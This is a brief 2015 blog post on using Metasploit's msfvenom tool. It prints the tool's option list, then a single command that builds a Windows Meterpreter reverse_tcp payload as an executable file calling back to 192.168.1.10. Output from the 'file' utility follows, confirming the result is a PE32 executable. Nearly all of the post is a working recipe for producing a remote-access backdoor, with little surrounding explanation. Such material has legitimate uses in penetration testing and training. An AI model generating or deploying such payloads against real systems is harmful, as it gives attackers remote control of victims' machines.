---
title: "MetaSploit Payload to Executable EXE"
date: 2015-01-08T17:22:37+00:00
url: "/metasploit-payload-executable-exe/"
draft: false
description: "msfvenom used to generate payloads with the architect and formate like"
categories: ["blog", "exploit-dev", "Security"]
---

```bash
# msfvenom
No options
Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>

Options:
    -p, --payload    <payload>       Payload to use. Specify a '-' or stdin to use custom payloads
    -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all
    -n, --nopsled    <length>        Prepend a nopsled of [length] size on to the payload
    -f, --format     <format>        Output format (use --help-formats for a list)
    -e, --encoder    [encoder]       The encoder to use
    -a, --arch       <architecture>  The architecture to use
        --platform   <platform>      The platform of the payload
    -s, --space      <length>        The maximum size of the resulting payload
    -b, --bad-chars  <list>          The list of characters to avoid example: '\x00\xff'
    -i, --iterations <count>         The number of times to encode the payload
    -c, --add-code   <path>          Specify an additional win32 shellcode file to include
    -x, --template   <path>          Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --options                    List the payload's standard options
    -h, --help                       Show this message
        --help-formats               List available formats
```

msfvenom used to generate payloads with the architect and formate like

```
msfvenom  -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.10 -a x86 -f exe > output.exe
```

 

```bash
# file output.exe 
output.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```
